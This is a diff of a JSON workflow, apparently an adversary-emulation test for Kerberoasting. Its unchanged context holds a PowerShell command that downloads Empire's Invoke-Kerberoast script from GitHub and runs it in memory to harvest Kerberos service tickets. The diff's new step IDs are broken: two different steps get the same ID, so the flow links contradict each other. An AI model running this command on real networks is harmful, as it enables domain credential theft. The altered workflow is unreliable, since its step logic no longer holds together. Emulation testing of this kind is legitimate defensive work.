@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "97d01bb1-1b24-4dc2-85db-b4a518f24047",
+      "id": "0e81ced8-f16f-5ff2-9a8d-9f4eacbd322f",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "c2c61d4f-94ed-4dfe-bc4d-457483436df4",
+      "id": "f396aa98-15fc-5ec8-b1ba-f136a6d984fa",
       "name": "Check dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "dd04e3ab-6992-456b-aa6c-49be0f6c5d36",
+      "id": "f6ed81ad-42c4-5823-ab55-dfc75410a2e0",
       "name": "Resolve dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "3b7d42b4-70b1-461d-85de-aa927acce709",
+      "id": "f396aa98-15fc-5ec8-b1ba-f136a6d984fa",
       "name": "Re-check dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "c2c61d4f-94ed-4dfe-bc4d-457483436df4",
+      "s": "f396aa98-15fc-5ec8-b1ba-f136a6d984fa",
       "p": "on-success",
-      "o": "97d01bb1-1b24-4dc2-85db-b4a518f24047"
+      "o": "0e81ced8-f16f-5ff2-9a8d-9f4eacbd322f"
     },
     {
-      "s": "c2c61d4f-94ed-4dfe-bc4d-457483436df4",
+      "s": "f396aa98-15fc-5ec8-b1ba-f136a6d984fa",
       "p": "on-failure",
-      "o": "dd04e3ab-6992-456b-aa6c-49be0f6c5d36"
+      "o": "f6ed81ad-42c4-5823-ab55-dfc75410a2e0"
     },
     {
-      "s": "dd04e3ab-6992-456b-aa6c-49be0f6c5d36",
+      "s": "f6ed81ad-42c4-5823-ab55-dfc75410a2e0",
       "p": "on-success",
-      "o": "3b7d42b4-70b1-461d-85de-aa927acce709"
+      "o": "f396aa98-15fc-5ec8-b1ba-f136a6d984fa"
     },
     {
-      "s": "3b7d42b4-70b1-461d-85de-aa927acce709",
+      "s": "f396aa98-15fc-5ec8-b1ba-f136a6d984fa",
       "p": "on-failure",
-      "o": "97d01bb1-1b24-4dc2-85db-b4a518f24047"
+      "o": "0e81ced8-f16f-5ff2-9a8d-9f4eacbd322f"
     }
   ],
   "tags": [
